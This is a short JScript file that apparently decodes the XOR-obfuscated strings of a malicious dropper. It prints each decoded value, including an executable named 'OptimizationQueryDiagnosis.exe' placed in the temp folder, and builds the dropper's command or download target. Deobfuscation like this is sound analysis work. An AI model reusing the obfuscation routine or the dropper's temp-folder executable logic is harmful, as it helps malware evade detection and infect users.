str = '0209397c403a0243625460517f105136717f607d35005c03595373475c5c0f763a4173326f2b645a';
WScript.echo (str + "  =>  " + eHgbcFR(str).toString());
str = '05092f220f0822103c43330f3e7a35122e3b223813343e0135470250303b27281d1734000b1a3e0d3a3a17447b7c3434131a5f6c31496f36';
WScript.echo (str + "  =>  " + eHgbcFR(str).toString());
str = '0f5612311016271c201e0b102b251312246163';
WScript.echo (str + "  =>  " + eHgbcFR(str).toString());
str = '3f042b2a153d3b1634182306';
WScript.echo (str + "  =>  " + eHgbcFR(str).toString());
str = '1e1920221514704179082f06';
WScript.echo (str + "  =>  " + eHgbcFR(str).toString());
str = '231c3a2f141139122304380d032302053016382d11281e3104146f0f1409';
WScript.echo (str + "  =>  " + eHgbcFR(str).toString());
str = '1e1920221514704179082f06';
WScript.echo (str + "  =>  " + eHgbcFR(str).toString());
//231c3a2f141139122304380d032302053016382d11281e3104146f0f1409  =>  OptimizationQueryDiagnosis.exe
str = '04183a360a426c5c3a0e3f107c3108016720246312291a3700022f1e1f432934181e2a18085962';
WScript.echo (str + "  =>  " + eHgbcFR(str).toString());

var YlOnOVZIke = new ActiveXObject('Scripting.FileSystemObject');
var XnjBfdkfMGaOa=YlOnOVZIke.GetSpecialFolder(2)+ '\\';
var mlWQjitF=XnjBfdkfMGaOa.toString() + 'OptimizationQueryDiagnosis.exe';
var GNKOSERV = mlWQjitF.toString();
WScript.echo ("GNKOSERV = " + GNKOSERV);
var vdknzEDy = eHgbcFR('05092f220f0822103c43330f3e7a35122e3b223813343e0135470250303b27281d1734000b1a3e0d3a3a17447b7c3434131a5f6c31496f36') + GNKOSERV.substring(3);
WScript.echo ("vdknzEDy = " + vdknzEDy );
	


function eHgbcFR(kTqvLL) {
    var rAxNIQcrfV = new Function('a', 'b', 'return a^b');
    var BPtDQdGD = 'llNFyxCsWmWcRVgwIRQLvFqBmgAj';
    j = 0;
    var retstr = '';
    for (i = 0; i < kTqvLL.length; i = i + 2) {
        var BPtDQdGDchar = BPtDQdGD.charCodeAt(j++);
        retstr += String.fromCharCode(rAxNIQcrfV(parseInt(kTqvLL.substr(i, 2), 16), BPtDQdGDchar));
        if (j == BPtDQdGD.length)
            j = 0;
    }
    return retstr;
}
